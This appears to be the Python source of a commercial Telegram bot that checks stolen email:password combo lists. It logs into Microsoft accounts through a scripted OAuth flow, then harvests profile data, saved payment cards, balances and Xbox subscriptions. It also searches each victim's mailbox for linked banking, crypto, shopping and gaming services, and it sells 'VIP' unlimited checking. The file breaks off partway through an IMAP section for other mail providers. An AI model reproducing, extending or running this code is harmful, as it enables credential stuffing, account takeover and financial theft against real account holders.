import os
import sys
import time
import json
import uuid
import queue
import threading
import requests
import re
import urllib.parse
import ssl
import imaplib
import base64
import random
import secrets
import email as email_lib
from email.header import decode_header as decode_hdr
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime, timedelta

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
API_BASE = "https://api.telegram.org/bot"
FILE_BASE = "https://api.telegram.org/file/bot"

# ── per-account hard timeout (seconds) ──────────────────────────
ACCOUNT_TIMEOUT = 90

# ── Telegram API ─────────────────────────────────────────────────
def api(method, data=None, files=None, _retries=2):
    for attempt in range(_retries + 1):
        try:
            r = requests.post(
                f"{API_BASE}{BOT_TOKEN}/{method}",
                data=data, files=files, timeout=(5, 30))
            return r.json()
        except Exception as e:
            if attempt == _retries:
                return {}
            time.sleep(1)
    return {}

def get_updates(offset=None, timeout=30):
    data = {"timeout": timeout}
    if offset:
        data["offset"] = offset
    return api("getUpdates", data)

def send_message(chat_id, text, reply_markup=None):
    data = {"chat_id": chat_id, "text": str(text)[:4096]}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    return api("sendMessage", data)

def edit_message(chat_id, message_id, text):
    data = {"chat_id": chat_id, "message_id": message_id, "text": str(text)[:4096]}
    try:
        return api("editMessageText", data)
    except Exception:
        return {}

# ── Access control / VIP ─────────────────────────────────────────
CONTROL_GROUP_ID = int(os.getenv("CONTROL_GROUP_ID", "-1002789978571"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7677328359"))
VIP_WINDOW_SECONDS = 2 * 60 * 60
NORMAL_LIMIT = 100

vip_codes = {}
vip_users_info = {}
user_usage = {}
reminder_marks = {}
all_users = set()
awaiting_broadcast = False

def generate_random_code(length=10):
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def create_vip_code(duration_type):
    code = generate_random_code(10)
    now = time.time()
    durations = {"day": 86400, "week": 86400*7, "month": 86400*30}
    duration = durations.get(duration_type, 3600)
    vip_codes[code] = {"expires": now + duration, "claimed_by": None,
                       "duration_type": duration_type, "duration": duration}
    return code

def try_claim_vip(user_id, code):
    code_str = str(code).strip().lower()
    if code_str == "codevipanon199":
        vip_users_info[user_id] = {"expires": time.time() + 315360000, "code": "ADMIN_OVERRIDE"}
        return True, "Unlimited VIP activated"
    info = vip_codes.get(code_str)
    if not info:
        return False, "Code not found"
    if time.time() > info["expires"]:
        return False, "Code expired"
    if info["claimed_by"] and info["claimed_by"] != user_id:
        return False, "Code already used"
    info["claimed_by"] = user_id
    vip_users_info[user_id] = {"expires": time.time() + info["duration"], "code": code_str}
    return True, f"VIP activated ({info['duration_type']})"

def check_user_limit(user_id, new_count):
    if user_id in vip_users_info:
        return True, 0
    rec = user_usage.get(user_id)
    now = time.time()
    if not rec or now - rec["start"] > VIP_WINDOW_SECONDS:
        user_usage[user_id] = {"start": now, "count": 0}
        rec = user_usage[user_id]
    if rec["count"] + new_count > NORMAL_LIMIT:
        remaining = int((VIP_WINDOW_SECONDS - (now - rec["start"])) / 60) + 1
        return False, max(remaining, 1)
    rec["count"] += new_count
    return True, 0

def schedule_limit_reset_message(user_id):
    try:
        rec = user_usage.get(user_id)
        if not rec: return
        ws = rec.get("start")
        if ws is None: return
        if reminder_marks.get(user_id) == ws: return
        reminder_marks[user_id] = ws
        delay = max(0, int(VIP_WINDOW_SECONDS - (time.time() - ws)))
        def _runner():
            time.sleep(delay)
            send_message(user_id,
                "you can now send another 100 accounts\n"
                "or you can buy this : \nunlimited check\n"
                "Search with your keywords\n"
                "if want send msg here : @anon_101")
        threading.Thread(target=_runner, daemon=True).start()
    except: pass

def check_vip_expiry():
    while True:
        try:
            now = time.time()
            expired = [uid for uid, info in list(vip_users_info.items())
                       if now > info.get("expires", 0)]
            for uid in expired:
                vip_users_info.pop(uid, None)
                send_message(uid, "Your VIP subscription has expired. To renew, contact: @anon_101")
        except: pass
        time.sleep(60)

threading.Thread(target=check_vip_expiry, daemon=True).start()

def send_document(chat_id, path, caption=None):
    try:
        with open(path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": chat_id}
            if caption:
                data["caption"] = str(caption)[:1024]
            return api("sendDocument", data, files=files)
    except Exception:
        return {}

# ── Helpers ───────────────────────────────────────────────────────
from datetime import datetime

def get_remaining_days(date_str):
    try:
        if not date_str: return "0"
        renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
        today = datetime.now(renewal_date.tzinfo)
        return str((renewal_date - today).days)
    except: return "0"

CURRENCY_SYMBOLS = {
    "USD": "$", "EUR": "€", "GBP": "£", "JPY": "¥", "CNY": "¥",
    "RUB": "₽", "TRY": "₺", "INR": "₹", "KRW": "₩", "AED": "د.إ",
    "SAR": "﷼", "QAR": "﷼", "KWD": "د.ك", "BHD": ".د.ب", "OMR": "﷼",
    "EGP": "£", "MAD": "د.م.", "TND": "د.ت", "DZD": "د.ج", "LBP": "ل.ل",
    "JOD": "د.أ", "ILS": "₪", "PKR": "₨", "BDT": "৳", "THB": "฿",
    "IDR": "Rp", "MYR": "RM", "SGD": "$", "HKD": "$", "AUD": "$",
    "NZD": "$", "CAD": "$", "MXN": "$", "ARS": "$", "CLP": "$",
    "COP": "$", "BRL": "R$", "PHP": "₱", "NGN": "₦", "ZAR": "R",
}
AMBIGUOUS_CODES = {"USD", "CAD", "AUD", "NZD", "MXN", "ARS", "CLP", "COP", "HKD", "SGD", "CNY", "JPY"}

def format_currency(amount, code=None):
    try:
        amt_str = str(amount).strip()
        if code: code = code.upper().strip()
        sym = CURRENCY_SYMBOLS.get(code or "", "")
        if sym:
            return f"{sym}{amt_str} {code}" if code in AMBIGUOUS_CODES else f"{sym}{amt_str}"
        return f"{amt_str} {code}" if code else amt_str
    except: return str(amount)

def get_file(file_id):
    j = api("getFile", {"file_id": file_id})
    if not j.get("ok"): return None
    fp = j["result"]["file_path"]
    try:
        r = requests.get(f"{FILE_BASE}{BOT_TOKEN}/{fp}", timeout=(5, 60))
        return r.content
    except: return None

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except: return "unknown"

def parse_accounts_bytes(data):
    if not data: return []
    lines = data.decode(errors="ignore").replace("\r\n", "\n").split("\n")
    out = []
    seen = set()
    for ln in lines:
        ln = ln.strip()
        if not ln: continue
        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,10}):(\S+)', ln)
        if match:
            em = match.group(1).lower().strip()
            pw = match.group(2).strip()
            k = f"{em}:{pw}"
            if k not in seen:
                seen.add(k)
                out.append((em, pw))
    return out


# ═══════════════════════════════════════════════════════════════
#  UnifiedChecker — optimised: parallel service checks, no IMAP fallback
# ═══════════════════════════════════════════════════════════════
class UnifiedChecker:
    # ─── timeouts: (connect_timeout, read_timeout) ───────────────
    _T_FAST  = (4, 8)   # fast requests (search, count)
    _T_LOGIN = (4, 12)  # login requests
    _T_SUBS  = (4, 10)  # subscriptions

    def __init__(self, debug=False, custom_services=None):
        self.session = requests.Session()
        self.session.trust_env = False
        self.session.proxies = {}
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10, pool_maxsize=20, max_retries=0)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        self.uuid = str(uuid.uuid4())
        self.debug = debug

        # services_map: query_string → display_name
        self.services_map = custom_services or {
            'advertise-support.facebook.com': 'Facebook',
            'mail.instagram.com': 'Instagram',
            'account.tiktok.com': 'TikTok',
            'x.com': 'Twitter',
            'youtube.com': 'YouTube',
            'discordapp.com': 'Discord',
            'spotify.com': 'Spotify',
            'netflix.com': 'Netflix',
            'steampowered.com': 'Steam',
            'epicgames.com': 'Epic Games',
            'riotgames.com': 'Riot Games',
            'ubisoft.com': 'Ubisoft',
            'blizzard.com': 'Blizzard',
            'rockstargames.com': 'Rockstar',
            'nintendo.com': 'Nintendo',
            'roblox.com': 'Roblox',
            'paypal.com': 'PayPal',
            'binance.com': 'Binance',
            'amazon.com': 'Amazon',
            'ebay.com': 'eBay',
            'aliexpress.com': 'AliExpress',
            'temu.com': 'Temu',
            'shein.com': 'Shein',
            'hulu.com': 'Hulu',
            'disneyplus.com': 'Disney+',
            'viu.com': 'Viu',
            'tubitv.com': 'Tubi TV',
            'crunchyroll.com': 'Crunchyroll',
            'ea.com': 'EA Sports',
            'battlenet.com': 'Battle.net',
            'apple.com': 'Apple',
            'icloud.com': 'iCloud',
            'canva.com': 'Canva',
            'github.com': 'GitHub',
            'gitlab.com': 'GitLab',
            'bitbucket.com': 'Bitbucket',
            'replit.com': 'Replit',
            'azure.microsoft.com': 'Azure',
            'metrobank.com.ph': 'Metrobank',
            'landbank.com': 'LandBank',
            'securitybank.com': 'Security Bank',
            'no-reply@coinbase.com': 'Coinbase',
            'etoro.com': 'eToro',
        }

    def log(self, msg):
        if self.debug: print(msg)

    def parse_country_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if k in j and j[k]:
                        return str(j[k])
                if 'accounts' in j:
                    for acc in j['accounts']:
                        if isinstance(acc, dict) and acc.get('location'):
                            return str(acc['location'])
        except: pass
        return ''

    def parse_name_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['displayName', 'name', 'givenName', 'fullName']:
                    if k in j and j[k]:
                        return str(j[k])
        except: pass
        return ''

    # ── Login ─────────────────────────────────────────────────────
    def _ms_hard_login(self, email, password):
        try:
            # Step 1: IDP check
            r1 = self.session.get(
                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
                headers={
                    "X-OneAuth-AppName": "Outlook Lite",
                    "X-Office-Version": "3.11.0-minApi24",
                    "X-CorrelationId": self.uuid,
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                    "Host": "odc.officeapps.live.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip"
                }, timeout=self._T_LOGIN)
            if "MSAccount" not in r1.text:
                return None

            time.sleep(0.2)

            # Step 2: Get auth page
            url2 = (
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                "?client_info=1&haschrome=1"
                f"&login_hint={email}&mkt=en&response_type=code"
                "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&scope=profile%20openid%20offline_access"
                "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
                "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            r2 = self.session.get(url2,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                allow_redirects=True, timeout=self._T_LOGIN)

            m_url  = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
            m_ppft = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^\"]+)\"', r2.text)
            if not m_url or not m_ppft:
                return None

            post_url = m_url.group(1).replace("\\/", "/")
            ppft     = m_ppft.group(1)

            # Step 3: POST credentials
            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
                "&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
                f"&passwd={urllib.parse.quote(password)}&ps=2"
                "&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK="
                "&canary=&ctx=&hpgrequestid="
                f"&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
                "&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
                "&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            )
            r3 = self.session.post(post_url, data=login_data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    "Origin": "https://login.live.com",
                    "Referer": r2.url,
                }, allow_redirects=False, timeout=self._T_LOGIN)

            resp_low = r3.text.lower()
            if "account or password is incorrect" in resp_low:
                return None
            if any(x in r3.text for x in ["identity/confirm", "Consent", "Abuse"]):
                return None

            loc = r3.headers.get("Location", "")
            m_code = re.search(r'code=([^&]+)', loc)
            if not m_code:
                return None
            code = m_code.group(1)

            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return None
            cid = mspcid.upper()

            # Step 4: Exchange code for tokens
            token_data = (
                "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
                "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                f"&grant_type=authorization_code&code={code}"
                "&scope=profile%20openid%20offline_access"
                "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            )
            r4 = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=self._T_LOGIN)
            if r4.status_code != 200 or "access_token" not in r4.text:
                return None

            j = r4.json()
            return {
                "access_token":  j.get("access_token", ""),
                "refresh_token": j.get("refresh_token", ""),
                "cid": cid
            }
        except requests.exceptions.Timeout:
            return None
        except Exception:
            return None

    # ── Profile & inbox ──────────────────────────────────────────
    def _graph_msg_count(self, at):
        try:
            r = self.session.get(
                "https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
                headers={"Authorization": f"Bearer {at}"},
                timeout=self._T_FAST)
            if r.status_code == 200:
                return r.json().get("totalItemCount", 0)
        except: pass
        return 0

    def _profile(self, at, cid):
        try:
            r = self.session.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers={
                    "Authorization": f"Bearer {at}",
                    "X-AnchorMailbox": f"CID:{cid}"
                }, timeout=self._T_FAST)
            if r.status_code == 200:
                j = r.json()
                return self.parse_country_from_json(j), self.parse_name_from_json(j)
        except: pass
        return "", ""

    # ── Microsoft subscriptions / balance ────────────────────────
    def check_microsoft_subscriptions(self, email, password, at, cid):
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            url = ("https://login.live.com/oauth20_authorize.srf"
                   "?client_id=000000000004773A&response_type=token"
                   "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                   "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                   "&state=" + urllib.parse.quote(state_json))
            r = self.session.get(url,
                headers={"User-Agent": "Mozilla/5.0"},
                allow_redirects=True, timeout=self._T_SUBS)
            payment_token = None
            text = r.text + " " + r.url
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, text)
                if m:
                    payment_token = urllib.parse.unquote(m.group(1))
                    break
            if not payment_token:
                return {"ms_status": "FREE", "ms_data": {},
                        "xbox": {"status": "FREE", "details": ""}}

            ms_data = {}
            h = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type": "application/json",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }

            # Balance + cards (single request)
            try:
                r_pay = self.session.get(
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me"
                    "/paymentInstrumentsEx?status=active,removed&language=en-US",
                    headers=h, timeout=self._T_SUBS)
                if r_pay.status_code == 200:
                    balances = re.findall(
                        r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?).*?"currency(?:Code)?"\s*:\s*"([A-Z]{3})"',
                        r_pay.text)
                    if balances:
                        ms_data["balances"] = [f"{a} {c}" for a, c in balances]
                        ms_data["balance_amount"]   = balances[0][0]
                        ms_data["balance_currency"] = balances[0][1]
                    cards = re.findall(
                        r'"paymentMethodFamily"\s*:\s*"([^"]+)".*?"name"\s*:\s*"([^"]+)"'
                        r'.*?"lastFourDigits"\s*:\s*"([^"]*)"',
                        r_pay.text, re.DOTALL)
                    if cards:
                        ms_data["cards"] = [f"{f} {n} (***{l})" for f, n, l in cards]
                    m3 = re.search(r'"availablePoints"\s*:\s*(\d+)', r_pay.text)
                    if m3:
                        ms_data["rewards_points"] = m3.group(1)
            except: pass

            # Xbox subscription
            xbox = {"status": "FREE", "details": ""}
            try:
                r_sub = self.session.get(
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                    headers=h, timeout=self._T_SUBS)
                if r_sub.status_code == 200:
                    t = r_sub.text
                    kw = {
                        'Xbox Game Pass Ultimate': 'Ultimate',
                        'PC Game Pass': 'PC Game Pass',
                        'EA Play': 'EA Play',
                        'Xbox Live Gold': 'Gold',
                        'Game Pass': 'Game Pass'
                    }
                    for k, nm in kw.items():
                        if k in t:
                            m = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', t)
                            if m:
                                days = get_remaining_days(m.group(1))
                                if not days.startswith('-'):
                                    xbox = {"status": "PREMIUM", "details": f"{nm} ({days}d)"}
                            else:
                                xbox = {"status": "PREMIUM", "details": nm}
                            break
            except: pass

            return {
                "ms_status": "PREMIUM" if xbox["status"] != "FREE" else "FREE",
                "ms_data": ms_data,
                "xbox": xbox
            }
        except Exception:
            return {"ms_status": "ERROR", "ms_data": {},
                    "xbox": {"status": "ERROR", "details": ""}}

    # ── Core Outlook Search (no IMAP fallback) ───────────────────
    def _search_count(self, access_token, cid, query, timeout=8):
        """Single Outlook search, returns total count. Fast path only."""
        try:
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "Size": 1,   # ← we only need Total, not results
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload,
                headers={
                    'User-Agent': 'Outlook-Android/2.0',
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Content-Type': 'application/json'
                }, timeout=(4, timeout))
            if r.status_code != 200:
                return 0
            for es in r.json().get('EntitySets', []):
                for rs in es.get('ResultSets', []):
                    return int(rs.get('Total', 0) or 0)
        except: pass
        return 0

    def _search_with_subject(self, access_token, cid, query, size=5, timeout=8):
        """Search and return (total, last_subject, last_date)."""
        try:
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "Size": size,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload,
                headers={
                    'User-Agent': 'Outlook-Android/2.0',
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Content-Type': 'application/json'
                }, timeout=(4, timeout))
            if r.status_code != 200:
                return 0, "", ""
            total, last_s, last_d = 0, "", ""
            for es in r.json().get('EntitySets', []):
                for rs in es.get('ResultSets', []):
                    total = int(rs.get('Total', 0) or 0)
                    if total > 0 and rs.get('Results'):
                        first = rs['Results'][0]
                        last_s = first.get('Subject', '')
                        last_d = first.get('ReceivedDateTime', '')
                    break
            return total, last_s[:100], last_d[:20]
        except: pass
        return 0, "", ""

    # ── Netflix / Facebook (no IMAP fallback) ────────────────────
    def check_netflix(self, access_token, cid, email_addr):
        total, subj, dt = self._search_with_subject(access_token, cid, 'info@account.netflix.com')
        return {
            "netflix_status": "LINKED" if total > 0 else "FREE",
            "netflix_emails": total,
            "netflix_last_subject": subj,
            "netflix_last_date": dt
        }

    def check_facebook(self, access_token, cid, email_addr):
        total, subj, dt = self._search_with_subject(access_token, cid, 'advertise-support.facebook.com')
        return {
            "facebook_status": "LINKED" if total > 0 else "FREE",
            "facebook_emails": total,
            "facebook_last_subject": subj,
            "facebook_last_date": dt
        }

    def check_psn(self, access_token, cid):
        q = ("sony@txn-email.playstation.com OR sony@txn-email01.playstation.com"
             " OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com")
        total = self._search_count(access_token, cid, q)
        return {"psn_status": "HAS_ORDERS" if total > 0 else "FREE",
                "psn_emails_count": total}

    def check_steam_simple(self, access_token, cid):
        total = self._search_count(access_token, cid,
            "store.steampowered.com OR noreply@steampowered.com OR Steam purchase")
        return {"steam_status": "HAS_PURCHASES" if total > 0 else "FREE",
                "steam_count": total}

    def check_minecraft_simple(self, access_token, cid):
        total = self._search_count(access_token, cid,
            "mojang.com OR minecraft.net OR noreply@mojang.com")
        return {"minecraft_status": "OWNED" if total > 0 else "FREE",
                "minecraft_emails": total}

    def check_paypal_simple(self, access_token, cid):
        total = self._search_count(access_token, cid, "service@paypal.com OR @paypal.com")
        return {"paypal_status": "LINKED" if total > 0 else "FREE",
                "paypal_emails": total}

    def check_epic_simple(self, access_token, cid):
        total = self._search_count(access_token, cid, "@epicgames.com OR Epic Games")
        return {"epic_status": "LINKED" if total > 0 else "FREE",
                "epic_emails": total}

    # ── Batch parallel service check ─────────────────────────────
    def _batch_check_services(self, access_token, cid, custom_domain=None):
        """
        Run ALL service checks in parallel (max 10 threads).
        First do a single combined OR query to see which batch has hits,
        then check individual services only in batches that returned > 0.
        Total wall time ≈ max(single_request_time) * 2 instead of N * request_time.
        """
        found = {}
        found_lock = threading.Lock()

        services = list(self.services_map.items())  # [(query, name), ...]
        if custom_domain:
            services.append((custom_domain.strip(), "Custom"))

        # Split into batches of 12 for pre-screening
        BATCH_SIZE = 12
        batches = [services[i:i+BATCH_SIZE] for i in range(0, len(services), BATCH_SIZE)]

        def check_batch(batch):
            # 1. Combined OR query — fast pre-screen
            combined = " OR ".join(q for q, _ in batch)
            pre_total = self._search_count(access_token, cid, combined, timeout=8)
            if pre_total == 0:
                return  # nothing in this batch

            # 2. Individual checks only for this batch (parallel)
            def check_one(q, name):
                cnt = self._search_count(access_token, cid, q, timeout=7)
                if cnt > 0:
                    with found_lock:
                        found[name] = True

            with ThreadPoolExecutor(max_workers=min(6, len(batch))) as ex2:
                futs2 = [ex2.submit(check_one, q, n) for q, n in batch]
                # wait max 20s per batch
                done2, _ = wait(futs2, timeout=20)
                for f in done2:
                    try: f.result()
                    except: pass

        # Run all batch pre-screens in parallel
        with ThreadPoolExecutor(max_workers=len(batches)) as ex:
            futs = [ex.submit(check_batch, b) for b in batches]
            # wait max 35s for all batches
            done, _ = wait(futs, timeout=35)
            for f in done:
                try: f.result()
                except: pass

        return found

    # ── Main check ───────────────────────────────────────────────
    def check(self, email, password, custom_domain=None):
        try:
            # Step A: Login
            auth = self._ms_hard_login(email, password)
            if not auth or not auth.get("access_token"):
                return {"status": "BAD"}
            at  = auth["access_token"]
            cid = auth.get("cid", "")

            # Step B: Profile + msg_count + subscriptions in parallel
            with ThreadPoolExecutor(max_workers=3) as ex:
                f_profile = ex.submit(self._profile, at, cid)
                f_msgs    = ex.submit(self._graph_msg_count, at)
                f_ms      = ex.submit(self.check_microsoft_subscriptions,
                                      email, password, at, cid)
                try:    country, name = f_profile.result(timeout=15)
                except: country, name = "", ""
                try:    msg_count = f_msgs.result(timeout=10)
                except: msg_count = 0
                try:    msr = f_ms.result(timeout=20)
                except: msr = {"ms_status": "ERROR", "ms_data": {},
                                "xbox": {"status": "ERROR", "details": ""}}

            # Step C: Netflix + Facebook + batch services all in parallel
            found_services = {}
            nf = {"netflix_status": "FREE",  "netflix_emails": 0,
                  "netflix_last_subject": "", "netflix_last_date": ""}
            fb = {"facebook_status": "FREE", "facebook_emails": 0,
                  "facebook_last_subject": "", "facebook_last_date": ""}

            with ThreadPoolExecutor(max_workers=3) as ex2:
                f_nf  = ex2.submit(self.check_netflix, at, cid, email)
                f_fb  = ex2.submit(self.check_facebook, at, cid, email)
                f_svc = ex2.submit(self._batch_check_services, at, cid, custom_domain)

                try:    nf  = f_nf.result(timeout=20)
                except: pass
                try:    fb  = f_fb.result(timeout=20)
                except: pass
                try:    found_services = f_svc.result(timeout=45)
                except: pass

            if nf.get("netflix_status")  == "LINKED": found_services["Netflix"]  = True
            if fb.get("facebook_status") == "LINKED": found_services["Facebook"] = True

            return {
                "status":    "HIT",
                "country":   country,
                "name":      name,
                "msg_count": msg_count,
                "email":     email,
                "password":  password,
                "services":  found_services,
                "service_details": {},
                "_access_token":  at,
                "_refresh_token": auth.get("refresh_token", ""),
                **msr,
                **nf,
                **fb,
                "psn_status":      "NONE",
                "steam_status":    "NONE",
                "supercell_status": "NONE",
                "tiktok_status":   "NONE",
                "minecraft_status": "NONE",
                "hypixel_status":  "NOT_FOUND",
            }
        except requests.exceptions.Timeout:
            return {"status": "BAD"}
        except Exception:
            return {"status": "BAD"}


# ── Balance text helper ──────────────────────────────────────────
def build_balance_text(ms_data):
    parts = []
    if isinstance(ms_data, dict):
        if "balances" in ms_data:
            parts.extend(ms_data["balances"])
        elif "balance_amount" in ms_data:
            amt = ms_data.get("balance_amount")
            cur = ms_data.get("balance_currency") or ""
            parts.append(format_currency(amt, cur or None))
        if "cards" in ms_data and ms_data["cards"]:
            parts.append("Cards: " + ", ".join(ms_data["cards"]))
        if "rewards_points" in ms_data:
            parts.append(f"Rewards:{ms_data['rewards_points']}")
    return " | ".join([p for p in parts if p]) if parts else "0.0 USD"

def format_result(res):
    email    = res.get("email", "")
    password = res.get("password", "")
    country  = (res.get("country") or "??").strip().upper()
    parts    = [f"{email}:{password}", country]
    xbox = res.get("xbox", {}) or {}
    xdet = xbox.get("details") or ""
    if xdet and xbox.get("status", "").upper() != "FREE":
        parts.append(f"Xbox: {xdet}")
    balance_text = build_balance_text(res.get("ms_data", {}))
    if balance_text:
        parts.append(balance_text)
    services = res.get("services", {}) or {}
    svc_list = [k for k, v in services.items() if v]
    if svc_list:
        parts.append(", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else ""))
    return " | ".join(parts)

def _take(lst, n):
    return list(lst[:n])

def format_full_details(res):
    lines = []
    email     = res.get("email", "")
    country   = (res.get("country") or "??").strip().upper()
    name      = res.get("name") or ""
    msg_count = res.get("msg_count", 0)
    lines += [f"Email: {email}", f"Name: {name}",
              f"Country: {country}", f"Msgs: {msg_count}"]
    xbox = res.get("xbox", {}) or {}
    if xbox:
        lines.append(f"Xbox: {xbox.get('details') or xbox.get('status') or 'N/A'}")
    ms = res.get("ms_data", {}) or {}
    btxt = build_balance_text(ms)
    if btxt:
        lines.append(f"Microsoft: {btxt}")
    if res.get("netflix_status") == "LINKED":
        lines.append(f"Netflix: {res.get('netflix_emails',0)} | "
                     f"{res.get('netflix_last_subject','')[:100]} | "
                     f"{res.get('netflix_last_date','')}")
    if res.get("facebook_status") == "LINKED":
        lines.append(f"Facebook: {res.get('facebook_emails',0)} | "
                     f"{res.get('facebook_last_subject','')[:100]} | "
                     f"{res.get('facebook_last_date','')}")
    sv = res.get("services", {}) or {}
    if sv:
        found = [k for k, v in sv.items() if v]
        lines.append("Services: " + ", ".join(_take(found, 20))
                     + (" ..." if len(found) > 20 else ""))
    out = "\n".join(lines)
    return out[:3900] + "\n..." if len(out) > 3900 else out


# ── IMAP (for non-MS accounts) ───────────────────────────────────
IMAP_SERVERS = {
    "gmail.com":      {"host": "imap.gmail.com",      "port": 993},
    "yahoo.com":      {"host": "imap.mail.yahoo.com", "port": 993},
    "icloud.com":     {"host": "imap.mail.me.com",    "port": 993},
    "aol.com":        {"host": "imap.aol.com",        "port": 993},
    "zoho.com":       {"host": "imap.zoho.com",       "port": 993},
    "fastmail.com":   {"host": "imap.fastmail.com",   "port": 993},
    "yandex.com":     {"host": "imap.yandex.com",     "port": 993},
    "yandex.ru":      {"host": "imap.yandex.ru",      "port": 993},
    "mail.ru":        {"host": "imap.mail.ru",        "port": 993},
    "bk.ru":          {"host": "imap.mail.ru",        "port": 993},
    "list.ru":        {"host": "imap.mail.ru",        "port": 993},
    "inbox.ru":       {"host": "imap.mail.ru",        "port": 993},
    "gmx.net":        {"host": "imap.gmx.net",        "port": 993},
    "gmx.com":        {"host": "imap.gmx.com",        "port": 993},
    "web.de":         {"host": "imap.web.de",         "port": 993},
    "t-online.de":    {"host": "imap.t-online.de",    "port": 993},
    "qq.com":         {"host": "imap.qq.com",         "port": 993},
    "163.com":        {"host": "imap.163.com",        "port": 993},
    "126.com":        {"host": "imap.126.com",        "port": 993},
    "protonmail.com": {"host": "imap.protonmail.com", "port": 993},
    "proton.me":      {"host": "imap.proton.me",      "port": 993},
}

IMAP_SERVICES = {
    "Netflix": "netflix.com", "Spotify": "spotify.com", "Discord": "discord.com",
    "Steam": "steampowered.com", "Epic Games": "epicgames.com", "Roblox": "roblox.com",
    "PayPal": "paypal.com", "Amazon": "amazon.com", "eBay": "ebay.com",
    "Facebook": "facebookmail.com", "Instagram": "instagram.com", "Twitter": "x.com",
